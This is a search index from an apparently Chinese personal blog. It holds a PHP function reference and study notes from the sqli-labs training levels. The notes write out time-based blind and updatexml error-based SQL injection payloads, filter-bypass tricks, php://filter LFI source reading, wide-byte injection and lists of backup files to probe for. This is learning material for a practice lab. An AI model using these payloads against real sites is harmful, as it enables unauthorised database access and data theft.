<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>常见PHP语法</title>
    <link href="/2023/04/19/php/"/>
    <url>/2023/04/19/php/</url>
    
    <content type="html"><![CDATA[<h2 id="Include"><a href="#Include" class="headerlink" title="Include()"></a>Include()</h2><p>Include(‘‘)用于获取指定文件中存在的所有文本，代码和标记，并复制到使用该语句的  </p><p>文件中，在服务器执行之前，将php文件的内容插入到另一个php文件。</p><h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>语法：<br>Sub(string,start,Length)<br><strong>string:</strong>  必须。规定要返回其中一部分的字符串。</p><blockquote><h4 id="start-必须。规定在字符串的何处开始。"><a href="#start-必须。规定在字符串的何处开始。" class="headerlink" title="start: 必须。规定在字符串的何处开始。"></a>start: 必须。规定在字符串的何处开始。</h4><ul><li>正数 - 在字符串的指定位置开始</li><li>负数 - 在从字符串结尾开始的指定位置开始</li><li>0 - 在字符串中的第一个字符处开始</li></ul></blockquote><blockquote><h4 id="Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。"><a href="#Length-可选。规定被返回字符串的长度。默认是直到字符串的结尾。" class="headerlink" title="Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。"></a>Length:可选。规定被返回字符串的长度。默认是直到字符串的结尾。</h4><ul><li>   正数 - 从 start 参数所在的位置返回的长度</li><li>   负数 - 从字符串末端返回的长度</li></ul></blockquote><h2 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval()函数"></a>intval()函数</h2><p>intval() 函数用于获取变量的整数值。<br>intval() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1。</p><blockquote><h4 id="int-intval-mixed-var-int-base-x3D-10"><a href="#int-intval-mixed-var-int-base-x3D-10" class="headerlink" title="int intval ( mixed $var [, int $base &#x3D; 10 ] )"></a>int intval ( mixed $var [, int $base &#x3D; 10 ] )</h4><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul></blockquote><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<br>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，<br>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，<br>将使用 10 进制 (decimal)。</p><h2 id="stype-alpha-函数"><a href="#stype-alpha-函数" class="headerlink" title="stype_alpha()函数"></a>stype_alpha()函数</h2><p>ctype_alpha()函数是PHP中的字符类型(CType)函数，用于检查给定的字符串是否仅包含字母。</p><p>如果字符串只包含字母，返回bool <strong>true</strong> ，否则返回<strong>false</strong>。<br>语法：<br>ctype_alpha(string):bool</p><h2 id="Is-numerice-函数"><a href="#Is-numerice-函数" class="headerlink" title="Is_numerice()函数:"></a>Is_numerice()函数:</h2><p>作用：<br>函数用于检测变量是否为数字或数字字符串。<br>返回值：<br>如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE，注意浮点型返回 1，即 TRUE。</p><p>hexdec()函数:<br>用法：<br>Hexdec()函数把十六进制转换为十进制。<br>语法：<br>Hexdec(hex_string)</p><p>Hex_string:必须，规定要转换的十六进制数</p><h2 id="preg-match-函数"><a href="#preg-match-函数" class="headerlink" title="preg_match()函数:"></a>preg_match()函数:</h2><p>Preg_match函数是进行<a href="https://blog.csdn.net/l1028386804/article/details/116778918?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168186276216800222868537%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=168186276216800222868537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-116778918-null-null.142%5Ev84%5Epc_search_v2,239%5Ev2%5Einsert_chatgpt&utm_term=%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2226.3001.4187">正则表达式</a>的匹配，成功返回1，否则返回0。</p><p>语法：<br>int preg_match ( string $pattern , string $subject [, array &amp;$matches [, int $flags &#x3D; 0 [, int $offset &#x3D; 0 ]]] )</p><blockquote><ul><li>$pattern: 要搜索的模式，字符串形式。</li><li>$subject: 输入字符串。</li><li>$matches: 如果提供了参数matches，它将被填充为搜索结果。 $matches[0]将包含完整模式匹配到的文本， $matches[1] 将包含第一个捕获子组匹配到的文本，以此类推。</li><li>$flags：flags 可以被设置为以下标记值：</li><li>1.PREG_OFFSET_CAPTURE: 如果传递了这个标记，对于每一个出现的匹配返回时会附加字符串偏移量(相对于目标字符串的)。 注意：这会改变填充到matches参数的数组，使其每个元素成为一个由 第0个元素是匹配到的字符串，第1个元素是该匹配字符串 在目标字符串subject中的偏移量。</li><li>offset: 通常，搜索从目标字符串的开始位置开始。可选参数 offset 用于 指定从目标字符串的某个未知开始搜索(单位是字节)。</li></ul></blockquote><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>返回 pattern 的匹配次数。 它的值将是 0 次（不匹配）或 1 次，因为 preg_match() 在第一次匹配后 将会停止搜索。preg_match_all() 不同于此，它会一直搜索subject 直到到达结尾。 如果发生错误preg_match()返回 FALSE。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>每周报告</title>
    <link href="/2023/04/15/my-blogneirong/"/>
    <url>/2023/04/15/my-blogneirong/</url>
    
    <content type="html"><![CDATA[<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>在通关sqllabs第9关与第10关时我们知道了时间盲注这一概念，<br>用时间盲注来判断注入点是否正确，使用sleep延迟函数。<br>if()函数条件判断函数<br>if(a,b,c)   if判断句，a为条件，b、c为执行语句；如果a为真就执行b，a为假就执行c;<br>sleep()函数网页延迟n秒后，输出结果<br>left（）函数             从左边数，取几个数<br>例如：left（abcdef，3）  取3位左边的数，就是abc  </p><ol><li>判断注入点：?id&#x3D;1 and sleep(10)–+ 如若页面加载则判断正确，否则尝试其他</li><li>爆库：?id&#x3D;1’ and if (length(database()) &#x3D; 8 ,sleep(4),1)–+ 如若延时则正确，?id&#x3D;1’ and If((substr(database(),1,1)&#x3D;’s’),sleep(5),1)–+ 挨个尝试找出八个字符库名security</li><li>爆表名：?id&#x3D;1’ and If((substr((select table_name from information_schema.tables where table_schema&#x3D;’security’ limit 3,1),1,1))&#x3D;‘u‘,sleep(4),1)–+ 等于users</li><li>爆字段：?id&#x3D;1’ and If(ascii(substr((select column_name from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database() limit 0,1),1,1))&#x3D;105,sleep(4),1)–+</li><li>爆数据：?id&#x3D;1’ and If( (substr((select username from users limit 0,1),1,1))&#x3D;’a’,sleep(4),1)–+</li></ol><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>在sqllabs 第13关中，可以测试出闭合点，但没有回显位，无法重复11，12题中的操作，所以这里我们尝试使用报错注入<br>1’)  and updatexml(1,concat(0x7e,(database()),0x7e),1) #<br><strong>虽然报错，但我们知道了库名为security</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema&#x3D;’security’ and table_name&#x3D;’users’),0x7e),1) #<br><strong>再求得表名</strong><br>1’)  and updatexml(1,concat(0x7e,(select group_concat(username)from users),0x7e),1) #<br><strong>再求得字段</strong><br>可求得username 和 password</p><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>在24关中需要用到二次注入的原理，二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户 输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br><strong>第一步：插入恶意数据</strong><br>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br><strong>第二步：引用恶意数据</strong><br>开发者默认存入数据库的数据都是安全的，在进行查询的时候，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤"></a>过滤</h2><p>在25，26关都过滤了or和and 所以遇到有or或and的地方需要双写，<br>例：information-&gt;information&amp;&amp;password-&gt;passwoorrd<br>但26关也过滤掉了空格和注释符，这时可以采用报错法求得，空格可用“%a0” 或 “%0b” 替代空格，同时可以使用）来代替空格的划分作用，使用 “||” 替代 “or”，使用 “%26%26” 替代 “and”。<br><strong>管道符（Linux管道命令操作符）：</strong><br><img src="/./images/heiheihei.jpg" alt="Linux管道命令操作符"><br>Linux-&gt;ls-&gt;list-&gt;列表-&gt;显示指定工作目录下的内容<br>Linux-&gt;cat-&gt;用于连接文件并打印到标准输出设备上</p><h2 id="filter伪协议"><a href="#filter伪协议" class="headerlink" title="filter伪协议"></a>filter伪协议</h2><p>php:&#x2F;&#x2F;filter是php中独有的一种协议，它是一种过滤器，可以作为一个中间流来过滤其他的数据流。通常使用该协议来读取或者写入部分数据，且在读取和写入之前对数据进行一些过滤，例如base64编码处理，rot13处理等。官方解释为：php:&#x2F;&#x2F;filter 是一种元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。<br>Filter协议的一般语法为：php:&#x2F;&#x2F;filter&#x2F;过滤器|过滤器&#x2F;resource&#x3D;待过滤的数据流<br><strong>通过php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D; 利用LFI来查看源码</strong><br><a href="https://blog.csdn.net/qq_29419013/article/details/81201494">filter详细信息</a><br><a href="https://zhuanlan.zhihu.com/p/50445145">filter详细信息</a></p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>如果服务器传入数据库的数据是gbk等宽字节编码，可以在特殊字符之前增加一个十六进制字节，和转义符构成一个汉字字符，从而把转义符吃掉。<br><a href="https://blog.csdn.net/weixin_42040292/article/details/90719507">宽字节注入</a><br><strong>Referer: 服务器伪造</strong><br><strong>X-Forwarded-For:用于修改ip</strong></p><p><strong>常见的网站源码备份文件后缀:</strong></p><ul><li>tar.gz，zip，rar，tar<br><strong>常见的网站源码备份文件名：</strong><br>web，website，backup，back，www，wwwroot，temp<br><strong>常见的备份文件后缀名有：</strong></li><li>.git .svn .swp .~ .bak .bash_history</li></ul><h2 id="php序列化与反序列化"><a href="#php序列化与反序列化" class="headerlink" title="php序列化与反序列化"></a>php序列化与反序列化</h2><p> <strong>序列化</strong>是将变量转换为可保存或传输的字符串的过程；<strong>反序列化</strong>就是在适当的时候把这个字符串再转化成原来的变量使用。这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。</p><p> <strong>弱比较：</strong>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行，在比较时该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
